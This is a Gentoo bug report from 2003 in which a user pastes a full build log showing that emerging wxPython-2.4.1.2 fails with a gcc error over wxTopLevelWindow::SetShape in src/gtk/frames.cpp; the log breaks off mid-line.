| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=25132&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=25132&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  P. Schnell    2003-07-23 12:08:22 UTC  ``` hi, when trying to emerge wxpython-2.4.1.2 i get the following error:    Calculating dependencies ...done!  >>> emerge (1 of 1) dev-python/wxPython-2.4.1.2 to /  >>> md5 src_uri ;-) wxPythonSrc-2.4.1.2.tar.gz  >>> Unpacking source...  >>> Unpacking wxPythonSrc-2.4.1.2.tar.gz to  /var/tmp/portage/wxPython-2.4.1.2/work   * Applying controls2.py.patch...                                         [ ok ]  >>> Source unpacked.  Found wx-config: /usr/bin/wxgtk-2.4-config  Preparing CORE...  Preparing GLCANVAS...  Preparing OGL...  Preparing STC...  Preparing XRC...  Preparing GIZMOS...  Preparing DLLWIDGET...  running build  running build_py  creating build  creating build/lib.linux-i686-2.2  creating build/lib.linux-i686-2.2/wxPython  copying wxPython/frames.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/cmndlgs.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/calendar.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/wx.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/oglshapes.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/dllwidget_.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/fonts.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/oglshapes2.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/misc.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/stattool.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/stc_.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/events.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/gdi.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/htmlhelp.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/controls.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/glcanvas.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/sizers.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/mdi.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/filesys.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/image.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/ogl.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/misc2.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/help.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/clip_dnd.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/grid.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/windows2.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/windows3.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/streams.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/stc.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/__version__.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/xrc.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/gizmos.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/wizard.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/oglcanvas.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/html.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/dllwidget.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/printfw.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/__init__.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/controls2.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/windows.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/oglbasic.py -> build/lib.linux-i686-2.2/wxPython  copying wxPython/utils.py -> build/lib.linux-i686-2.2/wxPython  creating build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/rightalign.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/gridmovers.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/calendar.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/rcsizer.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/anchors.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/wxpTag.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/floatbar.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/analogclock.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/grids.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/splashscreen.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/stattext.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/imageutils.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/wxPlotCanvas.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/colourselect.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/popupctl.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/dialogs.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/buttons.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/ErrorDialogs.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/filebrowsebutton.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/PythonBitmaps.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/ErrorDialogs_wdr.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/mvctree.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/maskededit.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/printout.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/activexwrapper.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/evtmgr.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/ClickableHtmlWindow.py ->  build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/imagebrowser.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/timectrl.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/vtk.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/rpcMixin.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/CDate.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/intctrl.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/multisash.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/colourdb.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/pubsub.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/pyshell.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/layoutf.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/__init__.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/infoframe.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/scrolledpanel.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/throbber.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/fancytext.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/sheet.py -> build/lib.linux-i686-2.2/wxPython/lib  copying wxPython/lib/shell.py -> build/lib.linux-i686-2.2/wxPython/lib  creating build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/canvas.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/pycolourslider.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/pycolourchooser.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/pycolourbox.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/pypalette.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/__init__.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  copying wxPython/lib/colourchooser/intl.py ->  build/lib.linux-i686-2.2/wxPython/lib/colourchooser  creating build/lib.linux-i686-2.2/wxPython/lib/editor  copying wxPython/lib/editor/editor.py ->  build/lib.linux-i686-2.2/wxPython/lib/editor  copying wxPython/lib/editor/selection.py ->  build/lib.linux-i686-2.2/wxPython/lib/editor  copying wxPython/lib/editor/images.py ->  build/lib.linux-i686-2.2/wxPython/lib/editor  copying wxPython/lib/editor/__init__.py ->  build/lib.linux-i686-2.2/wxPython/lib/editor  creating build/lib.linux-i686-2.2/wxPython/lib/mixins  copying wxPython/lib/mixins/imagelist.py ->  build/lib.linux-i686-2.2/wxPython/lib/mixins  copying wxPython/lib/mixins/listctrl.py ->  build/lib.linux-i686-2.2/wxPython/lib/mixins  copying wxPython/lib/mixins/grid.py -> build/lib.linux-i686-2.2/wxPython/lib/mixins  copying wxPython/lib/mixins/rubberband.py ->  build/lib.linux-i686-2.2/wxPython/lib/mixins  copying wxPython/lib/mixins/__init__.py ->  build/lib.linux-i686-2.2/wxPython/lib/mixins  creating build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/crust.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/PyFillingApp.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/filling.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/PyCrustApp.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/__init__.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/PyShellApp.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/wrap.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  copying wxPython/lib/PyCrust/shell.py ->  build/lib.linux-i686-2.2/wxPython/lib/PyCrust  creating build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/crust.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/pseudo.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/buffer.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyWrap.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/editor.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyAlaMode.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyShell.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/filling.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyCrust.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/frame.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/images.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyAlaModeTest.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/editwindow.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/dispatcher.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/interpreter.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/document.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyAlaCarte.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/__init__.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/PyFilling.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/version.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/introspect.py -> build/lib.linux-i686-2.2/wxPython/py  copying wxPython/py/shell.py -> build/lib.linux-i686-2.2/wxPython/py  creating build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/App.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/decorator.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/FileSystem.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Base.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Events.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Drawing.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Threading.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Printing.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/ImageHandlers.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Sizers.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Controls.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Joystick.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Dialogs.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/LayoutConstraints.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Validators.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/stc_.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/genapi.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/DateTime.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/gen.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Logging.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Process.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Streams.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/DataStructures.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/ToolBar.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Functions.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/MimeTypes.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Parameters.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Errors.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/EventFunctions.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Frames.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Accelerators.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Window.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Menus.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/wx_.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Misc.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/d_stc.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/StyledTextConstants.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/ClipDragDrop.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Config.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/__init__.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Tree.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/SashSplitter.py ->  build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Help.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/d_wx.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  copying wxPython/py/wxd/Panel.py -> build/lib.linux-i686-2.2/wxPython/py/wxd  creating build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/img2img.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/helpviewer.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/img2png.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/img2xpm.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/dbg.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/img2py.py -> build/lib.linux-i686-2.2/wxPython/tools  copying wxPython/tools/__init__.py -> build/lib.linux-i686-2.2/wxPython/tools  creating build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/panel.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/xrced.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/tree.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/images.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/globals.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/undo.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/tools.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/xxx.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/params.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/__init__.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  copying wxPython/tools/XRCed/encode_bitmaps.py ->  build/lib.linux-i686-2.2/wxPython/tools/XRCed  creating build/lib.linux-i686-2.2/wx  copying wx/calendar.py -> build/lib.linux-i686-2.2/wx  copying wx/glcanvas.py -> build/lib.linux-i686-2.2/wx  copying wx/ogl.py -> build/lib.linux-i686-2.2/wx  copying wx/help.py -> build/lib.linux-i686-2.2/wx  copying wx/grid.py -> build/lib.linux-i686-2.2/wx  copying wx/stc.py -> build/lib.linux-i686-2.2/wx  copying wx/iewin.py -> build/lib.linux-i686-2.2/wx  copying wx/xrc.py -> build/lib.linux-i686-2.2/wx  copying wx/gizmos.py -> build/lib.linux-i686-2.2/wx  copying wx/wizard.py -> build/lib.linux-i686-2.2/wx  copying wx/html.py -> build/lib.linux-i686-2.2/wx  copying wx/dllwidget.py -> build/lib.linux-i686-2.2/wx  copying wx/__init__.py -> build/lib.linux-i686-2.2/wx  creating build/lib.linux-i686-2.2/wx/lib  copying wx/lib/rightalign.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/gridmovers.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/calendar.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/rcsizer.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/anchors.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/wxpTag.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/floatbar.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/analogclock.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/grids.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/splashscreen.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/stattext.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/imageutils.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/wxPlotCanvas.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/colourselect.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/popupctl.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/dialogs.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/buttons.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/ErrorDialogs.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/filebrowsebutton.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/PythonBitmaps.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/ErrorDialogs_wdr.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/mvctree.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/maskededit.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/printout.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/activexwrapper.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/evtmgr.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/ClickableHtmlWindow.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/imagebrowser.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/timectrl.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/vtk.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/rpcMixin.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/CDate.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/intctrl.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/multisash.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/colourdb.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/pubsub.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/pyshell.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/layoutf.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/__init__.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/infoframe.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/scrolledpanel.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/throbber.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/fancytext.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/sheet.py -> build/lib.linux-i686-2.2/wx/lib  copying wx/lib/shell.py -> build/lib.linux-i686-2.2/wx/lib  creating build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/canvas.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/pycolourslider.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/pycolourchooser.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/pycolourbox.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/pypalette.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/__init__.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  copying wx/lib/colourchooser/intl.py ->  build/lib.linux-i686-2.2/wx/lib/colourchooser  creating build/lib.linux-i686-2.2/wx/lib/editor  copying wx/lib/editor/editor.py -> build/lib.linux-i686-2.2/wx/lib/editor  copying wx/lib/editor/selection.py -> build/lib.linux-i686-2.2/wx/lib/editor  copying wx/lib/editor/images.py -> build/lib.linux-i686-2.2/wx/lib/editor  copying wx/lib/editor/__init__.py -> build/lib.linux-i686-2.2/wx/lib/editor  creating build/lib.linux-i686-2.2/wx/lib/mixins  copying wx/lib/mixins/imagelist.py -> build/lib.linux-i686-2.2/wx/lib/mixins  copying wx/lib/mixins/listctrl.py -> build/lib.linux-i686-2.2/wx/lib/mixins  copying wx/lib/mixins/grid.py -> build/lib.linux-i686-2.2/wx/lib/mixins  copying wx/lib/mixins/rubberband.py -> build/lib.linux-i686-2.2/wx/lib/mixins  copying wx/lib/mixins/__init__.py -> build/lib.linux-i686-2.2/wx/lib/mixins  creating build/lib.linux-i686-2.2/wx/py  copying wx/py/crust.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/pseudo.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/buffer.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyWrap.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/editor.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyAlaMode.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyShell.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/filling.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyCrust.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/frame.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/images.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/editwindow.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/dispatcher.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/interpreter.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/document.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyAlaCarte.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/__init__.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/PyFilling.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/version.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/introspect.py -> build/lib.linux-i686-2.2/wx/py  copying wx/py/shell.py -> build/lib.linux-i686-2.2/wx/py  creating build/lib.linux-i686-2.2/wx/tools  copying wx/tools/img2img.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/helpviewer.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/img2png.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/img2xpm.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/dbg.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/img2py.py -> build/lib.linux-i686-2.2/wx/tools  copying wx/tools/__init__.py -> build/lib.linux-i686-2.2/wx/tools  creating build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/panel.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/xrced.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/tree.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/images.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/globals.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/undo.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/tools.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/xxx.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/params.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/__init__.py -> build/lib.linux-i686-2.2/wx/tools/XRCed  copying wx/tools/XRCed/encode_bitmaps.py ->  build/lib.linux-i686-2.2/wx/tools/XRCed  running build_ext  building 'wxc' extension  creating build/temp.linux-i686-2.2  creating build/temp.linux-i686-2.2/src  creating build/temp.linux-i686-2.2/src/gtk  gcc -DNDEBUG -march=athlon -mmmx -m3dnow -O3 -pipe -fomit-frame-pointer  -fPIC -DSWIG_GLOBAL -DHAVE_CONFIG_H -DWXP_USE_THREAD=1 -UNDEBUG  -Isrc -I/usr/include/python2.2 -c src/gtk/controls.cpp -o  build/temp.linux-i686-2.2/src/gtk/controls.o -I/usr/lib/wx/include/gtk-2.4  -DGTK_NO_CHECK_CASTS -D__WXGTK__ -D_FILE_OFFSET_BITS=64  -D_LARGE_FILES -I/usr/include/gtk-1.2 -I/usr/include/glib-1.2  -I/usr/lib/glib/include -I/usr/X11R6/include  gcc -DNDEBUG -march=athlon -mmmx -m3dnow -O3 -pipe -fomit-frame-pointer  -fPIC -DSWIG_GLOBAL -DHAVE_CONFIG_H -DWXP_USE_THREAD=1 -UNDEBUG  -Isrc -I/usr/include/python2.2 -c src/gtk/image.cpp -o  build/temp.linux-i686-2.2/src/gtk/image.o -I/usr/lib/wx/include/gtk-2.4  -DGTK_NO_CHECK_CASTS -D__WXGTK__ -D_FILE_OFFSET_BITS=64  -D_LARGE_FILES -I/usr/include/gtk-1.2 -I/usr/include/glib-1.2  -I/usr/lib/glib/include -I/usr/X11R6/include  gcc -DNDEBUG -march=athlon -mmmx -m3dnow -O3 -pipe -fomit-frame-pointer  -fPIC -DSWIG_GLOBAL -DHAVE_CONFIG_H -DWXP_USE_THREAD=1 -UNDEBUG  -Isrc -I/usr/include/python2.2 -c src/gtk/frames.cpp -o  build/temp.linux-i686-2.2/src/gtk/frames.o -I/usr/lib/wx/include/gtk-2.4  -DGTK_NO_CHECK_CASTS -D__WXGTK__ -D_FILE_OFFSET_BITS=64  -D_LARGE_FILES -I/usr/include/gtk-1.2 -I/usr/include/glib-1.2  -I/usr/lib/glib/include -I/usr/X11R6/include  src/gtk/frames.cpp: In function `PyObject*     _wrap_wxTopLevelWindow_SetShape(PyObject*, PyObject*, PyObject*)':  src/gtk/frames.cpp:716: no matching function for call to `wxTopLevelWindow::     SetShape(wxRegion&)'  error: command 'gcc' failed with exit status 1    !!! ERROR: dev-python/wxPython-2.4.1.2 failed.  !!! Function 